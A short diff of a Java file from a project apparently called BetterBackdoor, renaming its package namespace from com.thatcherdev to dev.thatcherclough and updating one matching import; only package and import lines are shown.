@@ -1,4 +1,4 @@
-package com.thatcherdev.betterbackdoor.backend;
+package dev.thatcherclough.betterbackdoor.backend;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -21,7 +21,7 @@ import java.util.zip.ZipEntry;
 import java.util.zip.ZipFile;
 import java.util.zip.ZipOutputStream;
 
-import com.thatcherdev.betterbackdoor.backdoor.Backdoor;
+import dev.thatcherclough.betterbackdoor.backdoor.Backdoor;
 
 import org.apache.commons.io.FileUtils;
 import org.apache.commons.io.IOUtils;
